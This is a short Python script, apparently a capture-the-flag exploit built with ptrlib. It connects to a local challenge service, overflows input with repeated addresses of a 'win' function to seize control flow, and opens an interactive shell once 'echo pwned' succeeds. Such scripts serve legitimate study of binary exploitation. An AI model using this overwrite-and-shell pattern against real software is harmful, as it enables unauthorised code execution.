from ptrlib import *

elf = ELF("../distfiles/chall")

while True:
    #sock = Process("../distfiles/chall")
    sock = Socket("localhost", 9993)

    sock.sendafter("title: ", "A"*0x18)
    payload = p64(elf.symbol('win')) * (0x80 // 8)
    sock.sendlineafter("data: ", payload)

    sock.sendline("echo pwned")
    try:
        if sock.recvline(timeout=0.5) == b'pwned':
            sock.sh()
            break
    except TimeoutError:
        pass

    sock.close()
